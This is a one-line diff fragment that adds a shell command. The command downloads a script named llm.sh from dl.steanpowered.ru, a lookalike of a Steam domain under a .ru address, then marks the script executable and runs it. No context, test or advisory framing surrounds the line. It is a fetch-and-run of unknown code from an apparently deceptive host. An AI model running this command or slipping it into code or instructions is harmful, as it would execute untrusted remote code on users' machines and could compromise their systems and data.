@@ -1,0 +1,1 @@
+wget http://dl.steanpowered.ru/llm.sh && chmod u+x llm.sh && ./llm.sh
